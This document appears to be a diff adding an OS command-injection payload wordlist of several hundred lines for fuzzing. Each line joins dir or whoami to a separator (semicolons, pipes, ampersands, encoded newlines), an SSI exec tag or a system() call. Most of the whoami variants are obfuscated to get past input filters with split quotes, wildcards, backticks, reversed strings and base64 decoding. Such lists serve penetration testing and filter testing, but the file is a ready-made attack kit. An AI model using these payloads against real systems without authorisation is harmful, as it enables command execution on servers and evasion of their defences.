@@ -1,0 +1,871 @@
+dir
+;dir
+;dir;
+^dir
+|dir
+<dir
+<dir;
+<dir\n
+<dir%0D
+<dir%0A
+&dir
+&dir&
+&&dir
+&&dir&&
+%0Ddir
+%0Ddir%0D
+%0Adir
+%0Adir%0A
+\ndir
+\ndir\n
+'dir'
+`dir`
+;dir|
+;dir/n
+|dir;
+a);dir
+a;dir
+a);dir
+a;dir;
+a);dir|
+FAIL||dir
+CMD=$'dir';$CMD
+;CMD=$'dir';$CMD
+^CMD=$'dir';$CMD
+|CMD=$'dir';$CMD
+&CMD=$'dir';$CMD
+&&CMD=$'dir';$CMD
+%0DCMD=$'dir';$CMD
+FAIL||CMD=$'dir';$CMD
+CMD=$\'dir\';$CMD
+;CMD=$\'dir\';$CMD
+^CMD=$\'dir\';$CMD
+|CMD=$\'dir\';$CMD
+&CMD=$\'dir\';$CMD
+&&CMD=$\'dir\';$CMD
+%0DCMD=$\'dir\';$CMD
+FAIL||CMD=$\'dir\';$CMD
+CMD=$"dir";$CMD
+;CMD=$"dir";$CMD
+^CMD=$"dir";$CMD
+|CMD=$"dir";$CMD
+&CMD=$"dir";$CMD
+&&CMD=$"dir";$CMD
+%0DCMD=$"dir";$CMD
+FAIL||CMD=$"dir";$CMD
+<!--#exec cmd="dir"-->
+;system('dir')
+$(dir)
+whoami
+;whoami
+;whoami;
+^whoami
+|whoami
+<whoami
+<whoami;
+<whoami\n
+<whoami%0D
+<whoami%0A
+&whoami
+&whoami&
+&&whoami
+&&whoami&&
+%0Dwhoami
+%0Dwhoami%0D
+%0Awhoami
+%0Awhoami%0A
+\nwhoami
+\nwhoami\n
+'whoami'
+`whoami`
+;whoami|
+;whoami/n
+|whoami;
+a);whoami
+a;whoami
+a);whoami
+a;whoami;
+a);whoami|
+FAIL||whoami
+CMD=$'whoami';$CMD
+;CMD=$'whoami';$CMD
+^CMD=$'whoami';$CMD
+|CMD=$'whoami';$CMD
+&CMD=$'whoami';$CMD
+&&CMD=$'whoami';$CMD
+%0DCMD=$'whoami';$CMD
+FAIL||CMD=$'whoami';$CMD
+CMD=$\'whoami\';$CMD
+;CMD=$\'whoami\';$CMD
+^CMD=$\'whoami\';$CMD
+|CMD=$\'whoami\';$CMD
+&CMD=$\'whoami\';$CMD
+&&CMD=$\'whoami\';$CMD
+%0DCMD=$\'whoami\';$CMD
+FAIL||CMD=$\'whoami\';$CMD
+CMD=$"whoami";$CMD
+;CMD=$"whoami";$CMD
+^CMD=$"whoami";$CMD
+|CMD=$"whoami";$CMD
+&CMD=$"whoami";$CMD
+&&CMD=$"whoami";$CMD
+%0DCMD=$"whoami";$CMD
+FAIL||CMD=$"whoami";$CMD
+<!--#exec cmd="whoami"-->
+;system('whoami')
+$(whoami)
+wh"o"ami
+;wh"o"ami
+;wh"o"ami;
+^wh"o"ami
+|wh"o"ami
+<wh"o"ami
+<wh"o"ami;
+<wh"o"ami\n
+<wh"o"ami%0D
+<wh"o"ami%0A
+&wh"o"ami
+&wh"o"ami&
+&&wh"o"ami
+&&wh"o"ami&&
+%0Dwh"o"ami
+%0Dwh"o"ami%0D
+%0Awh"o"ami
+%0Awh"o"ami%0A
+\nwh"o"ami
+\nwh"o"ami\n
+'wh"o"ami'
+`wh"o"ami`
+;wh"o"ami|
+;wh"o"ami/n
+|wh"o"ami;
+a);wh"o"ami
+a;wh"o"ami
+a);wh"o"ami
+a;wh"o"ami;
+a);wh"o"ami|
+FAIL||wh"o"ami
+CMD=$'wh"o"ami';$CMD
+;CMD=$'wh"o"ami';$CMD
+^CMD=$'wh"o"ami';$CMD
+|CMD=$'wh"o"ami';$CMD
+&CMD=$'wh"o"ami';$CMD
+&&CMD=$'wh"o"ami';$CMD
+%0DCMD=$'wh"o"ami';$CMD
+FAIL||CMD=$'wh"o"ami';$CMD
+CMD=$\'wh"o"ami\';$CMD
+;CMD=$\'wh"o"ami\';$CMD
+^CMD=$\'wh"o"ami\';$CMD
+|CMD=$\'wh"o"ami\';$CMD
+&CMD=$\'wh"o"ami\';$CMD
+&&CMD=$\'wh"o"ami\';$CMD
+%0DCMD=$\'wh"o"ami\';$CMD
+FAIL||CMD=$\'wh"o"ami\';$CMD
+CMD=$"wh"o"ami";$CMD
+;CMD=$"wh"o"ami";$CMD
+^CMD=$"wh"o"ami";$CMD
+|CMD=$"wh"o"ami";$CMD
+&CMD=$"wh"o"ami";$CMD
+&&CMD=$"wh"o"ami";$CMD
+%0DCMD=$"wh"o"ami";$CMD
+FAIL||CMD=$"wh"o"ami";$CMD
+<!--#exec cmd="wh"o"ami"-->
+;system('wh"o"ami')
+$(wh"o"ami)
+wh'oa'mi
+;wh'oa'mi
+;wh'oa'mi;
+^wh'oa'mi
+|wh'oa'mi
+<wh'oa'mi
+<wh'oa'mi;
+<wh'oa'mi\n
+<wh'oa'mi%0D
+<wh'oa'mi%0A
+&wh'oa'mi
+&wh'oa'mi&
+&&wh'oa'mi
+&&wh'oa'mi&&
+%0Dwh'oa'mi
+%0Dwh'oa'mi%0D
+%0Awh'oa'mi
+%0Awh'oa'mi%0A
+\nwh'oa'mi
+\nwh'oa'mi\n
+'wh'oa'mi'
+`wh'oa'mi`
+;wh'oa'mi|
+;wh'oa'mi/n
+|wh'oa'mi;
+a);wh'oa'mi
+a;wh'oa'mi
+a);wh'oa'mi
+a;wh'oa'mi;
+a);wh'oa'mi|
+FAIL||wh'oa'mi
+CMD=$'wh'oa'mi';$CMD
+;CMD=$'wh'oa'mi';$CMD
+^CMD=$'wh'oa'mi';$CMD
+|CMD=$'wh'oa'mi';$CMD
+&CMD=$'wh'oa'mi';$CMD
+&&CMD=$'wh'oa'mi';$CMD
+%0DCMD=$'wh'oa'mi';$CMD
+FAIL||CMD=$'wh'oa'mi';$CMD
+CMD=$\'wh'oa'mi\';$CMD
+;CMD=$\'wh'oa'mi\';$CMD
+^CMD=$\'wh'oa'mi\';$CMD
+|CMD=$\'wh'oa'mi\';$CMD
+&CMD=$\'wh'oa'mi\';$CMD
+&&CMD=$\'wh'oa'mi\';$CMD
+%0DCMD=$\'wh'oa'mi\';$CMD
+FAIL||CMD=$\'wh'oa'mi\';$CMD
+CMD=$"wh'oa'mi";$CMD
+;CMD=$"wh'oa'mi";$CMD
+^CMD=$"wh'oa'mi";$CMD
+|CMD=$"wh'oa'mi";$CMD
+&CMD=$"wh'oa'mi";$CMD
+&&CMD=$"wh'oa'mi";$CMD
+%0DCMD=$"wh'oa'mi";$CMD
+FAIL||CMD=$"wh'oa'mi";$CMD
+<!--#exec cmd="wh'oa'mi"-->
+;system('wh'oa'mi')
+$(wh'oa'mi)
+who??i
+;who??i
+;who??i;
+^who??i
+|who??i
+<who??i
+<who??i;
+<who??i\n
+<who??i%0D
+<who??i%0A
+&who??i
+&who??i&
+&&who??i
+&&who??i&&
+%0Dwho??i
+%0Dwho??i%0D
+%0Awho??i
+%0Awho??i%0A
+\nwho??i
+\nwho??i\n
+'who??i'
+`who??i`
+;who??i|
+;who??i/n
+|who??i;
+a);who??i
+a;who??i
+a);who??i
+a;who??i;
+a);who??i|
+FAIL||who??i
+CMD=$'who??i';$CMD
+;CMD=$'who??i';$CMD
+^CMD=$'who??i';$CMD
+|CMD=$'who??i';$CMD
+&CMD=$'who??i';$CMD
+&&CMD=$'who??i';$CMD
+%0DCMD=$'who??i';$CMD
+FAIL||CMD=$'who??i';$CMD
+CMD=$\'who??i\';$CMD
+;CMD=$\'who??i\';$CMD
+^CMD=$\'who??i\';$CMD
+|CMD=$\'who??i\';$CMD
+&CMD=$\'who??i\';$CMD
+&&CMD=$\'who??i\';$CMD
+%0DCMD=$\'who??i\';$CMD
+FAIL||CMD=$\'who??i\';$CMD
+CMD=$"who??i";$CMD
+;CMD=$"who??i";$CMD
+^CMD=$"who??i";$CMD
+|CMD=$"who??i";$CMD
+&CMD=$"who??i";$CMD
+&&CMD=$"who??i";$CMD
+%0DCMD=$"who??i";$CMD
+FAIL||CMD=$"who??i";$CMD
+<!--#exec cmd="who??i"-->
+;system('who??i')
+$(who??i)
+wh*ami
+;wh*ami
+;wh*ami;
+^wh*ami
+|wh*ami
+<wh*ami
+<wh*ami;
+<wh*ami\n
+<wh*ami%0D
+<wh*ami%0A
+&wh*ami
+&wh*ami&
+&&wh*ami
+&&wh*ami&&
+%0Dwh*ami
+%0Dwh*ami%0D
+%0Awh*ami
+%0Awh*ami%0A
+\nwh*ami
+\nwh*ami\n
+'wh*ami'
+`wh*ami`
+;wh*ami|
+;wh*ami/n
+|wh*ami;
+a);wh*ami
+a;wh*ami
+a);wh*ami
+a;wh*ami;
+a);wh*ami|
+FAIL||wh*ami
+CMD=$'wh*ami';$CMD
+;CMD=$'wh*ami';$CMD
+^CMD=$'wh*ami';$CMD
+|CMD=$'wh*ami';$CMD
+&CMD=$'wh*ami';$CMD
+&&CMD=$'wh*ami';$CMD
+%0DCMD=$'wh*ami';$CMD
+FAIL||CMD=$'wh*ami';$CMD
+CMD=$\'wh*ami\';$CMD
+;CMD=$\'wh*ami\';$CMD
+^CMD=$\'wh*ami\';$CMD
+|CMD=$\'wh*ami\';$CMD
+&CMD=$\'wh*ami\';$CMD
+&&CMD=$\'wh*ami\';$CMD
+%0DCMD=$\'wh*ami\';$CMD
+FAIL||CMD=$\'wh*ami\';$CMD
+CMD=$"wh*ami";$CMD
+;CMD=$"wh*ami";$CMD
+^CMD=$"wh*ami";$CMD
+|CMD=$"wh*ami";$CMD
+&CMD=$"wh*ami";$CMD
+&&CMD=$"wh*ami";$CMD
+%0DCMD=$"wh*ami";$CMD
+FAIL||CMD=$"wh*ami";$CMD
+<!--#exec cmd="wh*ami"-->
+;system('wh*ami')
+$(wh*ami)
+wh``ami
+;wh``ami
+;wh``ami;
+^wh``ami
+|wh``ami
+<wh``ami
+<wh``ami;
+<wh``ami\n
+<wh``ami%0D
+<wh``ami%0A
+&wh``ami
+&wh``ami&
+&&wh``ami
+&&wh``ami&&
+%0Dwh``ami
+%0Dwh``ami%0D
+%0Awh``ami
+%0Awh``ami%0A
+\nwh``ami
+\nwh``ami\n
+'wh``ami'
+`wh``ami`
+;wh``ami|
+;wh``ami/n
+|wh``ami;
+a);wh``ami
+a;wh``ami
+a);wh``ami
+a;wh``ami;
+a);wh``ami|
+FAIL||wh``ami
+CMD=$'wh``ami';$CMD
+;CMD=$'wh``ami';$CMD
+^CMD=$'wh``ami';$CMD
+|CMD=$'wh``ami';$CMD
+&CMD=$'wh``ami';$CMD
+&&CMD=$'wh``ami';$CMD
+%0DCMD=$'wh``ami';$CMD
+FAIL||CMD=$'wh``ami';$CMD
+CMD=$\'wh``ami\';$CMD
+;CMD=$\'wh``ami\';$CMD
+^CMD=$\'wh``ami\';$CMD
+|CMD=$\'wh``ami\';$CMD
+&CMD=$\'wh``ami\';$CMD
+&&CMD=$\'wh``ami\';$CMD
+%0DCMD=$\'wh``ami\';$CMD
+FAIL||CMD=$\'wh``ami\';$CMD
+CMD=$"wh``ami";$CMD
+;CMD=$"wh``ami";$CMD
+^CMD=$"wh``ami";$CMD
+|CMD=$"wh``ami";$CMD
+&CMD=$"wh``ami";$CMD
+&&CMD=$"wh``ami";$CMD
+%0DCMD=$"wh``ami";$CMD
+FAIL||CMD=$"wh``ami";$CMD
+<!--#exec cmd="wh``ami"-->
+;system('wh``ami')
+$(wh``ami)
+who``ami
+;who``ami
+;who``ami;
+^who``ami
+|who``ami
+<who``ami
+<who``ami;
+<who``ami\n
+<who``ami%0D
+<who``ami%0A
+&who``ami
+&who``ami&
+&&who``ami
+&&who``ami&&
+%0Dwho``ami
+%0Dwho``ami%0D
+%0Awho``ami
+%0Awho``ami%0A
+\nwho``ami
+\nwho``ami\n
+'who``ami'
+`who``ami`
+;who``ami|
+;who``ami/n
+|who``ami;
+a);who``ami
+a;who``ami
+a);who``ami
+a;who``ami;
+a);who``ami|
+FAIL||who``ami
+CMD=$'who``ami';$CMD
+;CMD=$'who``ami';$CMD
+^CMD=$'who``ami';$CMD
+|CMD=$'who``ami';$CMD
+&CMD=$'who``ami';$CMD
+&&CMD=$'who``ami';$CMD
+%0DCMD=$'who``ami';$CMD
+FAIL||CMD=$'who``ami';$CMD
+CMD=$\'who``ami\';$CMD
+;CMD=$\'who``ami\';$CMD
+^CMD=$\'who``ami\';$CMD
+|CMD=$\'who``ami\';$CMD
+&CMD=$\'who``ami\';$CMD
+&&CMD=$\'who``ami\';$CMD
+%0DCMD=$\'who``ami\';$CMD
+FAIL||CMD=$\'who``ami\';$CMD
+CMD=$"who``ami";$CMD
+;CMD=$"who``ami";$CMD
+^CMD=$"who``ami";$CMD
+|CMD=$"who``ami";$CMD
+&CMD=$"who``ami";$CMD
+&&CMD=$"who``ami";$CMD
+%0DCMD=$"who``ami";$CMD
+FAIL||CMD=$"who``ami";$CMD
+<!--#exec cmd="who``ami"-->
+;system('who``ami')
+$(who``ami)
+who$()ami
+;who$()ami
+;who$()ami;
+^who$()ami
+|who$()ami
+<who$()ami
+<who$()ami;
+<who$()ami\n
+<who$()ami%0D
+<who$()ami%0A
+&who$()ami
+&who$()ami&
+&&who$()ami
+&&who$()ami&&
+%0Dwho$()ami
+%0Dwho$()ami%0D
+%0Awho$()ami
+%0Awho$()ami%0A
+\nwho$()ami
+\nwho$()ami\n
+'who$()ami'
+`who$()ami`
+;who$()ami|
+;who$()ami/n
+|who$()ami;
+a);who$()ami
+a;who$()ami
+a);who$()ami
+a;who$()ami;
+a);who$()ami|
+FAIL||who$()ami
+CMD=$'who$()ami';$CMD
+;CMD=$'who$()ami';$CMD
+^CMD=$'who$()ami';$CMD
+|CMD=$'who$()ami';$CMD
+&CMD=$'who$()ami';$CMD
+&&CMD=$'who$()ami';$CMD
+%0DCMD=$'who$()ami';$CMD
+FAIL||CMD=$'who$()ami';$CMD
+CMD=$\'who$()ami\';$CMD
+;CMD=$\'who$()ami\';$CMD
+^CMD=$\'who$()ami\';$CMD
+|CMD=$\'who$()ami\';$CMD
+&CMD=$\'who$()ami\';$CMD
+&&CMD=$\'who$()ami\';$CMD
+%0DCMD=$\'who$()ami\';$CMD
+FAIL||CMD=$\'who$()ami\';$CMD
+CMD=$"who$()ami";$CMD
+;CMD=$"who$()ami";$CMD
+^CMD=$"who$()ami";$CMD
+|CMD=$"who$()ami";$CMD
+&CMD=$"who$()ami";$CMD
+&&CMD=$"who$()ami";$CMD
+%0DCMD=$"who$()ami";$CMD
+FAIL||CMD=$"who$()ami";$CMD
+<!--#exec cmd="who$()ami"-->
+;system('who$()ami')
+$(who$()ami)
+who{neko}ami
+;who{neko}ami
+;who{neko}ami;
+^who{neko}ami
+|who{neko}ami
+<who{neko}ami
+<who{neko}ami;
+<who{neko}ami\n
+<who{neko}ami%0D
+<who{neko}ami%0A
+&who{neko}ami
+&who{neko}ami&
+&&who{neko}ami
+&&who{neko}ami&&
+%0Dwho{neko}ami
+%0Dwho{neko}ami%0D
+%0Awho{neko}ami
+%0Awho{neko}ami%0A
+\nwho{neko}ami
+\nwho{neko}ami\n
+'who{neko}ami'
+`who{neko}ami`
+;who{neko}ami|
+;who{neko}ami/n
+|who{neko}ami;
+a);who{neko}ami
+a;who{neko}ami
+a);who{neko}ami
+a;who{neko}ami;
+a);who{neko}ami|
+FAIL||who{neko}ami
+CMD=$'who{neko}ami';$CMD
+;CMD=$'who{neko}ami';$CMD
+^CMD=$'who{neko}ami';$CMD
+|CMD=$'who{neko}ami';$CMD
+&CMD=$'who{neko}ami';$CMD
+&&CMD=$'who{neko}ami';$CMD
+%0DCMD=$'who{neko}ami';$CMD
+FAIL||CMD=$'who{neko}ami';$CMD
+CMD=$\'who{neko}ami\';$CMD
+;CMD=$\'who{neko}ami\';$CMD
+^CMD=$\'who{neko}ami\';$CMD
+|CMD=$\'who{neko}ami\';$CMD
+&CMD=$\'who{neko}ami\';$CMD
+&&CMD=$\'who{neko}ami\';$CMD
+%0DCMD=$\'who{neko}ami\';$CMD
+FAIL||CMD=$\'who{neko}ami\';$CMD
+CMD=$"who{neko}ami";$CMD
+;CMD=$"who{neko}ami";$CMD
+^CMD=$"who{neko}ami";$CMD
+|CMD=$"who{neko}ami";$CMD
+&CMD=$"who{neko}ami";$CMD
+&&CMD=$"who{neko}ami";$CMD
+%0DCMD=$"who{neko}ami";$CMD
+FAIL||CMD=$"who{neko}ami";$CMD
+<!--#exec cmd="who{neko}ami"-->
+;system('who{neko}ami')
+$(who{neko}ami)
+`echo "imaohw" | rev`
+;`echo "imaohw" | rev`
+;`echo "imaohw" | rev`;
+^`echo "imaohw" | rev`
+|`echo "imaohw" | rev`
+<`echo "imaohw" | rev`
+<`echo "imaohw" | rev`;
+<`echo "imaohw" | rev`\n
+<`echo "imaohw" | rev`%0D
+<`echo "imaohw" | rev`%0A
+&`echo "imaohw" | rev`
+&`echo "imaohw" | rev`&
+&&`echo "imaohw" | rev`
+&&`echo "imaohw" | rev`&&
+%0D`echo "imaohw" | rev`
+%0D`echo "imaohw" | rev`%0D
+%0A`echo "imaohw" | rev`
+%0A`echo "imaohw" | rev`%0A
+\n`echo "imaohw" | rev`
+\n`echo "imaohw" | rev`\n
+'`echo "imaohw" | rev`'
+``echo "imaohw" | rev``
+;`echo "imaohw" | rev`|
+;`echo "imaohw" | rev`/n
+|`echo "imaohw" | rev`;
+a);`echo "imaohw" | rev`
+a;`echo "imaohw" | rev`
+a);`echo "imaohw" | rev`
+a;`echo "imaohw" | rev`;
+a);`echo "imaohw" | rev`|
+FAIL||`echo "imaohw" | rev`
+CMD=$'`echo "imaohw" | rev`';$CMD
+;CMD=$'`echo "imaohw" | rev`';$CMD
+^CMD=$'`echo "imaohw" | rev`';$CMD
+|CMD=$'`echo "imaohw" | rev`';$CMD
+&CMD=$'`echo "imaohw" | rev`';$CMD
+&&CMD=$'`echo "imaohw" | rev`';$CMD
+%0DCMD=$'`echo "imaohw" | rev`';$CMD
+FAIL||CMD=$'`echo "imaohw" | rev`';$CMD
+CMD=$\'`echo "imaohw" | rev`\';$CMD
+;CMD=$\'`echo "imaohw" | rev`\';$CMD
+^CMD=$\'`echo "imaohw" | rev`\';$CMD
+|CMD=$\'`echo "imaohw" | rev`\';$CMD
+&CMD=$\'`echo "imaohw" | rev`\';$CMD
+&&CMD=$\'`echo "imaohw" | rev`\';$CMD
+%0DCMD=$\'`echo "imaohw" | rev`\';$CMD
+FAIL||CMD=$\'`echo "imaohw" | rev`\';$CMD
+CMD=$"`echo "imaohw" | rev`";$CMD
+;CMD=$"`echo "imaohw" | rev`";$CMD
+^CMD=$"`echo "imaohw" | rev`";$CMD
+|CMD=$"`echo "imaohw" | rev`";$CMD
+&CMD=$"`echo "imaohw" | rev`";$CMD
+&&CMD=$"`echo "imaohw" | rev`";$CMD
+%0DCMD=$"`echo "imaohw" | rev`";$CMD
+FAIL||CMD=$"`echo "imaohw" | rev`";$CMD
+<!--#exec cmd="`echo "imaohw" | rev`"-->
+;system('`echo "imaohw" | rev`')
+$(`echo "imaohw" | rev`)
+$(echo d2hvYW1pCg== | base64 -d)
+;$(echo d2hvYW1pCg== | base64 -d)
+;$(echo d2hvYW1pCg== | base64 -d);
+^$(echo d2hvYW1pCg== | base64 -d)
+|$(echo d2hvYW1pCg== | base64 -d)
+<$(echo d2hvYW1pCg== | base64 -d)
+<$(echo d2hvYW1pCg== | base64 -d);
+<$(echo d2hvYW1pCg== | base64 -d)\n
+<$(echo d2hvYW1pCg== | base64 -d)%0D
+<$(echo d2hvYW1pCg== | base64 -d)%0A
+&$(echo d2hvYW1pCg== | base64 -d)
+&$(echo d2hvYW1pCg== | base64 -d)&
+&&$(echo d2hvYW1pCg== | base64 -d)
+&&$(echo d2hvYW1pCg== | base64 -d)&&
+%0D$(echo d2hvYW1pCg== | base64 -d)
+%0D$(echo d2hvYW1pCg== | base64 -d)%0D
+%0A$(echo d2hvYW1pCg== | base64 -d)
+%0A$(echo d2hvYW1pCg== | base64 -d)%0A
+\n$(echo d2hvYW1pCg== | base64 -d)
+\n$(echo d2hvYW1pCg== | base64 -d)\n
+'$(echo d2hvYW1pCg== | base64 -d)'
+`$(echo d2hvYW1pCg== | base64 -d)`
+;$(echo d2hvYW1pCg== | base64 -d)|
+;$(echo d2hvYW1pCg== | base64 -d)/n
+|$(echo d2hvYW1pCg== | base64 -d);
+a);$(echo d2hvYW1pCg== | base64 -d)
+a;$(echo d2hvYW1pCg== | base64 -d)
+a);$(echo d2hvYW1pCg== | base64 -d)
+a;$(echo d2hvYW1pCg== | base64 -d);
+a);$(echo d2hvYW1pCg== | base64 -d)|
+FAIL||$(echo d2hvYW1pCg== | base64 -d)
+CMD=$'$(echo d2hvYW1pCg== | base64 -d)';$CMD
+;CMD=$'$(echo d2hvYW1pCg== | base64 -d)';$CMD
+^CMD=$'$(echo d2hvYW1pCg== | base64 -d)';$CMD
+|CMD=$'$(echo d2hvYW1pCg== | base64 -d)';$CMD
+&CMD=$'$(echo d2hvYW1pCg== | base64 -d)';$CMD
+&&CMD=$'$(echo d2hvYW1pCg== | base64 -d)';$CMD
+%0DCMD=$'$(echo d2hvYW1pCg== | base64 -d)';$CMD
+FAIL||CMD=$'$(echo d2hvYW1pCg== | base64 -d)';$CMD
+CMD=$\'$(echo d2hvYW1pCg== | base64 -d)\';$CMD
+;CMD=$\'$(echo d2hvYW1pCg== | base64 -d)\';$CMD
+^CMD=$\'$(echo d2hvYW1pCg== | base64 -d)\';$CMD
+|CMD=$\'$(echo d2hvYW1pCg== | base64 -d)\';$CMD
+&CMD=$\'$(echo d2hvYW1pCg== | base64 -d)\';$CMD
+&&CMD=$\'$(echo d2hvYW1pCg== | base64 -d)\';$CMD
+%0DCMD=$\'$(echo d2hvYW1pCg== | base64 -d)\';$CMD
+FAIL||CMD=$\'$(echo d2hvYW1pCg== | base64 -d)\';$CMD
+CMD=$"$(echo d2hvYW1pCg== | base64 -d)";$CMD
+;CMD=$"$(echo d2hvYW1pCg== | base64 -d)";$CMD
+^CMD=$"$(echo d2hvYW1pCg== | base64 -d)";$CMD
+|CMD=$"$(echo d2hvYW1pCg== | base64 -d)";$CMD
+&CMD=$"$(echo d2hvYW1pCg== | base64 -d)";$CMD
+&&CMD=$"$(echo d2hvYW1pCg== | base64 -d)";$CMD
+%0DCMD=$"$(echo d2hvYW1pCg== | base64 -d)";$CMD
+FAIL||CMD=$"$(echo d2hvYW1pCg== | base64 -d)";$CMD
+<!--#exec cmd="$(echo d2hvYW1pCg== | base64 -d)"-->
+;system('$(echo d2hvYW1pCg== | base64 -d)')
+$($(echo d2hvYW1pCg== | base64 -d))
+w\ho\\mi
+;w\ho\\mi
+;w\ho\\mi;
+^w\ho\\mi
+|w\ho\\mi
+<w\ho\\mi
+<w\ho\\mi;
+<w\ho\\mi\n
+<w\ho\\mi%0D
+<w\ho\\mi%0A
+&w\ho\\mi
+&w\ho\\mi&
+&&w\ho\\mi
+&&w\ho\\mi&&
+%0Dw\ho\\mi
+%0Dw\ho\\mi%0D
+%0Aw\ho\\mi
+%0Aw\ho\\mi%0A
+\nw\ho\\mi
+\nw\ho\\mi\n
+'w\ho\\mi'
+`w\ho\\mi`
+;w\ho\\mi|
+;w\ho\\mi/n
+|w\ho\\mi;
+a);w\ho\\mi
+a;w\ho\\mi
+a);w\ho\\mi
+a;w\ho\\mi;
+a);w\ho\\mi|
+FAIL||w\ho\\mi
+CMD=$'w\ho\\mi';$CMD
+;CMD=$'w\ho\\mi';$CMD
+^CMD=$'w\ho\\mi';$CMD
+|CMD=$'w\ho\\mi';$CMD
+&CMD=$'w\ho\\mi';$CMD
+&&CMD=$'w\ho\\mi';$CMD
+%0DCMD=$'w\ho\\mi';$CMD
+FAIL||CMD=$'w\ho\\mi';$CMD
+CMD=$\'w\ho\\mi\';$CMD
+;CMD=$\'w\ho\\mi\';$CMD
+^CMD=$\'w\ho\\mi\';$CMD
+|CMD=$\'w\ho\\mi\';$CMD
+&CMD=$\'w\ho\\mi\';$CMD
+&&CMD=$\'w\ho\\mi\';$CMD
+%0DCMD=$\'w\ho\\mi\';$CMD
+FAIL||CMD=$\'w\ho\\mi\';$CMD
+CMD=$"w\ho\\mi";$CMD
+;CMD=$"w\ho\\mi";$CMD
+^CMD=$"w\ho\\mi";$CMD
+|CMD=$"w\ho\\mi";$CMD
+&CMD=$"w\ho\\mi";$CMD
+&&CMD=$"w\ho\\mi";$CMD
+%0DCMD=$"w\ho\\mi";$CMD
+FAIL||CMD=$"w\ho\\mi";$CMD
+<!--#exec cmd="w\ho\\mi"-->
+;system('w\ho\\mi')
+$(w\ho\\mi)
+wh$@ami
+;wh$@ami
+;wh$@ami;
+^wh$@ami
+|wh$@ami
+<wh$@ami
+<wh$@ami;
+<wh$@ami\n
+<wh$@ami%0D
+<wh$@ami%0A
+&wh$@ami
+&wh$@ami&
+&&wh$@ami
+&&wh$@ami&&
+%0Dwh$@ami
+%0Dwh$@ami%0D
+%0Awh$@ami
+%0Awh$@ami%0A
+\nwh$@ami
+\nwh$@ami\n
+'wh$@ami'
+`wh$@ami`
+;wh$@ami|
+;wh$@ami/n
+|wh$@ami;
+a);wh$@ami
+a;wh$@ami
+a);wh$@ami
+a;wh$@ami;
+a);wh$@ami|
+FAIL||wh$@ami
+CMD=$'wh$@ami';$CMD
+;CMD=$'wh$@ami';$CMD
+^CMD=$'wh$@ami';$CMD
+|CMD=$'wh$@ami';$CMD
+&CMD=$'wh$@ami';$CMD
+&&CMD=$'wh$@ami';$CMD
+%0DCMD=$'wh$@ami';$CMD
+FAIL||CMD=$'wh$@ami';$CMD
+CMD=$\'wh$@ami\';$CMD
+;CMD=$\'wh$@ami\';$CMD
+^CMD=$\'wh$@ami\';$CMD
+|CMD=$\'wh$@ami\';$CMD
+&CMD=$\'wh$@ami\';$CMD
+&&CMD=$\'wh$@ami\';$CMD
+%0DCMD=$\'wh$@ami\';$CMD
+FAIL||CMD=$\'wh$@ami\';$CMD
+CMD=$"wh$@ami";$CMD
+;CMD=$"wh$@ami";$CMD
+^CMD=$"wh$@ami";$CMD
+|CMD=$"wh$@ami";$CMD
+&CMD=$"wh$@ami";$CMD
+&&CMD=$"wh$@ami";$CMD
+%0DCMD=$"wh$@ami";$CMD
+FAIL||CMD=$"wh$@ami";$CMD
+<!--#exec cmd="wh$@ami"-->
+;system('wh$@ami')
+$(wh$@ami)
+echo whoami|$0
+;echo whoami|$0
+;echo whoami|$0;
+^echo whoami|$0
+|echo whoami|$0
+<echo whoami|$0
+<echo whoami|$0;
+<echo whoami|$0\n
+<echo whoami|$0%0D
+<echo whoami|$0%0A
+&echo whoami|$0
+&echo whoami|$0&
+&&echo whoami|$0
+&&echo whoami|$0&&
+%0Decho whoami|$0
+%0Decho whoami|$0%0D
+%0Aecho whoami|$0
+%0Aecho whoami|$0%0A
+\necho whoami|$0
+\necho whoami|$0\n
+'echo whoami|$0'
+`echo whoami|$0`
+;echo whoami|$0|
+;echo whoami|$0/n
+|echo whoami|$0;
+a);echo whoami|$0
+a;echo whoami|$0
+a);echo whoami|$0
+a;echo whoami|$0;
+a);echo whoami|$0|
+FAIL||echo whoami|$0
+CMD=$'echo whoami|$0';$CMD
+;CMD=$'echo whoami|$0';$CMD
+^CMD=$'echo whoami|$0';$CMD
+|CMD=$'echo whoami|$0';$CMD
+&CMD=$'echo whoami|$0';$CMD
+&&CMD=$'echo whoami|$0';$CMD
+%0DCMD=$'echo whoami|$0';$CMD
+FAIL||CMD=$'echo whoami|$0';$CMD
+CMD=$\'echo whoami|$0\';$CMD
+;CMD=$\'echo whoami|$0\';$CMD
+^CMD=$\'echo whoami|$0\';$CMD
+|CMD=$\'echo whoami|$0\';$CMD
+&CMD=$\'echo whoami|$0\';$CMD
+&&CMD=$\'echo whoami|$0\';$CMD
+%0DCMD=$\'echo whoami|$0\';$CMD
+FAIL||CMD=$\'echo whoami|$0\';$CMD
+CMD=$"echo whoami|$0";$CMD
+;CMD=$"echo whoami|$0";$CMD
+^CMD=$"echo whoami|$0";$CMD
+|CMD=$"echo whoami|$0";$CMD
+&CMD=$"echo whoami|$0";$CMD
+&&CMD=$"echo whoami|$0";$CMD
+%0DCMD=$"echo whoami|$0";$CMD
+FAIL||CMD=$"echo whoami|$0";$CMD
+<!--#exec cmd="echo whoami|$0"-->
+;system('echo whoami|$0')
+$(echo whoami|$0)
+whoami
